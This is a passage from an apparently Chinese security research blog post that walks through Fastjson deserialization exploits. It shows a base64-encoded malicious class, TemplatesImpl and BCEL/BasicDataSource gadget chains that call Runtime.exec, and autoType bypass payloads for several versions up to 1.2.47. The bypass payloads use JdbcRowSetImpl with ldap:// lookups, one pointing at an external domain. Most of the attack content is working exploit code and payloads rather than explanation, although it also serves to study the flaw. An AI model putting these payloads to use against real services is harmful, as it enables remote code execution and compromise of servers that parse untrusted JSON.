AAEQASAAAADAABAAAABQATABQAAAABABUAFgACABAAAAA/AAAAAwAAAAGxAAAAAgARAAAABgABAAAAHwASAAAAIAADAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACABAAAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAAJAASAAAAKgAEAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAHgACAAAAAQAfACAAAwAbAAAABAABABwACAAhAA8AAQAQAAAAhwAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAMAEQAAAB4ABwAAABMACAAVABIAFgAdABkAIAAXACEAGAAlABoAEgAAABYAAgASAAsAIgAjAAAAIQAEACQAJQAAACYAAAAHAAJgBwAnBAABACgAAAACACk=</span><br></pre></td></tr></table></figure>

<p>把恶意类的字节码构造进json即可</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">package com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImpl <span class="punctuation">&#123;</span></span><br><span class="line">    static String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public static void main(String<span class="punctuation">[</span><span class="punctuation">]</span> args) throws Exception <span class="punctuation">&#123;</span></span><br><span class="line">        String TemplatesImplPayload = <span class="string">&quot;yv66vgAAADQASwoADQAqCQArACwIAC0KAC4ALwcAMAgAMQoAMgAzCgAyADQKADUANgcANwoACgA4BwA5BwA6AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC5MY29tL3k1bmVrby9zZWMvZmFzdGpzb24vVGVtcGxhdGVzSW1wbFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEYXJnMAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEABGFyZzEBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEYXJnMgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADcBAApTb3VyY2VGaWxlAQAZVGVtcGxhdGVzSW1wbFBheWxvYWQuamF2YQwADgAPBwA8DAA9AD4BAAdTdWNjZXNzBwA/DABAAEEBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcAQgwAQwBEDABFAEYHAEcMAEgASQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEoADwEALGNvbS95NW5la28vc2VjL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANlcnIBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAd3YWl0Rm9yAQADKClJAQAPcHJpbnRTdGFja1RyYWNlACEADAANAAAAAAAEAAEADgAPAAEAEAAAAC8AAQABAAAABSq3AAGxAAAAAgARAAAABgABAAAAEQASAAAADAABAAAABQATABQAAAABABUAFgACABAAAAA/AAAAAwAAAAGxAAAAAgARAAAABgABAAAAHwASAAAAIAADAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACABAAAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAAJAASAAAAKgAEAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAHgACAAAAAQAfACAAAwAbAAAABAABABwACAAhAA8AAQAQAAAAhwAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAMAEQAAAB4ABwAAABMACAAVABIAFgAdABkAIAAXACEAGAAlABoAEgAAABYAAgASAAsAIgAjAAAAIQAEACQAJQAAACYAAAAHAAJgBwAnBAABACgAAAACACk=&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + TemplatesImplPayload + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(payload<span class="punctuation">,</span> Object.class<span class="punctuation">,</span> config<span class="punctuation">,</span> Feature.SupportNonPublicField);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="FastJsonBcel类-动态类加载（不出网）"><a href="#FastJsonBcel类-动态类加载（不出网）" class="headerlink" title="FastJsonBcel类+动态类加载（不出网）"></a>FastJsonBcel类+动态类加载（不出网）</h4><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>jdk的内置类中找到了这样一方法，能够进行动态类加载，就是ClassLoader里面的loadClass方法，在里面调用了defineClass：</p>
<img src="/image/image-20231023111904053.png" alt="image-20231023111904053" style="zoom:80%;" />

<p>我们可以看到，如果要调用defineClass方法，要保证clazz不为null，我们就需要调用前面的createClass方法</p>
<img src="/image/image-20231023120041498.png" alt="image-20231023120041498" style="zoom:80%;" />

<p>里面通过decode方法加载了字节码，因此payload中需要先进行一次encode编码，大致构造一下payload结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\TemplatesImplPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String s) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们考虑怎么调用loadClass方法，分析发现在tomcat包下面找到了一个BasicDataSource的类，里面的createConnectionFactory方法调用了forName方法，这里forName方法的底层逻辑其实调用了loadClass方法，所以如果我们让<strong>dirverClassLoader</strong>等于ClassLoader，让<strong>dirverClassName</strong>等于我们自己的恶意类，就可以执行。</p>
<img src="/image/image-20231023172802956.png" alt="image-20231023172802956" style="zoom:80%;" />

<p>恰好这两个变量还能够通过setter方法进行可控</p>
<img src="/image/image-20231023173818782.png" alt="image-20231023173818782" style="zoom:80%;" />

<p>接下来看哪里能够调用forName方法对应的createConnectionFactory方法</p>
<img src="/image/image-20231023174245749.png" alt="image-20231023174245749" style="zoom:80%;" />

<p>最后我们找到了createDataSource方法，继续分析用法，最终找到了getConnection方法</p>
<img src="/image/image-20231023174600624.png" alt="image-20231023174600624" style="zoom:80%;" />

<h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><p>根据上面的分析，我们大致可以构造一条调用流程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="comment">//转字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\TemplatesImplPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String filePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取文件为字节码</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteOutput.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteOutput.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把调用过程转换成fastjson payload</p>
<p><strong>FastjsonBcelPayload.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcelPayload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>EXP</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="comment">//转字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\FastjsonBcelPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(&quot;$$BCEL$$&quot; + code);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String filePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取文件为字节码</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteOutput.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteOutput.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231024143414700.png" alt="image-20231024143414700" style="zoom:80%;" />

<h3 id="FastJson-2"><a href="#FastJson-2" class="headerlink" title="FastJson&lt;&#x3D;1.2.47绕过"></a>FastJson&lt;&#x3D;1.2.47绕过</h3><p>我们可以发现在1.2.25中，对<code>@type</code>进行了修复，检测了是否能够进行<code>AutoType</code>，而1.2.24在这里是直接进行<code>loadClass</code>，所以我们就要对这里进行一个绕过</p>
<blockquote>
<p>见FastJSON-&gt;分析-&gt;parseObject</p>
</blockquote>
<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>我们跟进到parseObject方法</p>
<img src="/image/image-20231024151342329.png" alt="image-20231024151342329" style="zoom:80%;" />

<p>可以看到在这里引入了checkAutoType方法检测AutoType，检验流程</p>
<p><img src="/image/20230723230324-12283792-296a-1-1698131709133-3.png" alt="20230723230324-12283792-296a-1"></p>
<p>分析一下五种能加载类的方法</p>
<ul>
<li>在第一个中，因为在白名单中才能够进行缓存，所以这里不符合要求</li>
<li>在第二个返回类当中，期望类为空且类与期望类一致的时候返回类，这里我们的期望类为空，所以这里能够符合条件，所以我们在往上找，只要缓存中存在类，我们就能够进行加载。</li>
<li>第三个也是白名单限制</li>
<li>第四个是基于期望类的，因为这里和期望类并无关所以也满足不了</li>
<li>进入false来到第五个，又因为默认情况下AutoType为false，所以也加载不了</li>
</ul>
<p>也就是说我们只能通过第二个想办法</p>
<img src="/image/image-20231024154429926.png" alt="image-20231024154429926" style="zoom:80%;" />

<p>接下来详细分析一下如何在缓存中加载我们需要的类</p>
<p>我们跟进getClassFromMapping方法中，从里面找mapping里面的缓存</p>
<img src="/image/image-20231024155407127.png" alt="image-20231024155407127" style="zoom:80%;" />

<p>然后在loadClass中我们可以发现是有可能对类进行控制的，其他地方都是指定了一些基础类进行的缓存，而loadClass这里只要我们加载类成功以后，他就会放入缓存中，下次调用直接从缓存中进行加载，这里我们就要想怎么才能够在loadClass的时候将我们的类加载入缓存当中</p>
<p>继续查找loadClass用法</p>
<img src="/image/image-20231024161927983.png" alt="image-20231024161927983" style="zoom:80%;" />

<p>最后确定了MiscCodec里面的deserialize函数中，当clazz&#x3D;&#x3D;Class.class的时候会进行调用，然后我们来观察MiscCodec可以发现，他继承了反序列化和序列化的接口，在fastJson的反序列化中也会把他当作反序列化器来进行调用</p>
<img src="/image/image-20231024162030827.png" alt="image-20231024162030827" style="zoom:80%;" />

<p>如果FastJson反序列化的类是属于Class.class的时候，就会调用MiscCodec反序列化器，然后调用loadClass，传入我们想传入的字符串strVal，然后在loadClass中作为String className进行加载并放在缓存里面。</p>
<img src="/image/image-20231024205341228.png" alt="image-20231024205341228" style="zoom:80%;" />

<p>具体赋值在MiscCodec的deserialize方法</p>
<img src="/image/image-20231025094750576.png" alt="image-20231025094750576" style="zoom:80%;" />

<img src="/image/image-20231025094834897.png" alt="image-20231025094834897" style="zoom:80%;" />

<p>我们可以看到这里的<code>parser</code>对应的就是后面的<code>lexer.stringVal</code>比较，必须满足是val才能够不抛出异常，所以我们就让string&#x3D;val就可以，然后后面我们对应反序列化的内容为恶意类就可以</p>
<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBypass_1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://ysmdiskerm.dgrh3.cn/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231025095940823.png" alt="image-20231025095940823" style="zoom:80%;" />

<h3 id="FastJson1-2-25-1-2-41绕过"><a href="#FastJson1-2-25-1-2-41绕过" class="headerlink" title="FastJson1.2.25-1.2.41绕过"></a>FastJson1.2.25-1.2.41绕过</h3><p>在上个分析提到过，在缓存中获取类的下面有两个判断，也就是说在我们开启AutoType的情况下可以用下面两种方式来进行绕过：</p>
<ul>
<li>如果以<code>[</code>开头则去掉<code>[</code>后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li>
<li>如果以<code>L</code>开头，以<code>;</code>结尾，则去掉开头和结尾进行类加载</li>
</ul>
<h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBypassL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        String s=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:1&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson1-2-42绕过"><a href="#FastJson1-2-42绕过" class="headerlink" title="FastJson1.2.42绕过"></a>FastJson1.2.42绕过</h3><p>1.2.42相较于之前的版本，关键是在<code>ParserConfig.java</code>中修改了1.2.41前的代码</p>
<ul>
<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
</ul>
<p>但是可以发现在以上的处理中，只删除了一次开头的<code>L</code>和结尾的<code>;</code>，双写可以绕过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson1-4-43绕过"><a href="#FastJson1-4-43绕过" class="headerlink" title="FastJson1.4.43绕过"></a>FastJson1.4.43绕过</h3><p>1.2.43版本修改了<code>checkAutoType()</code>的部分代码，对于LL等开头结尾的字符串抛出异常，这里我们就可以用<code>[</code>和<code>&#123;</code>进行绕过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;DataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:8085/hFtNevZa&quot;</span>,<span class="string">&quot;AutoCommit&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson原生反序列化"><a href="#FastJson原生反序列化" class="headerlink" title="FastJson原生反序列化"></a>FastJson原生反序列化</h3><p>依靠其他依赖的利用链，总归会受到环境的影响，因此我们可以尝试找出fastjson的原生反序列化链</p>
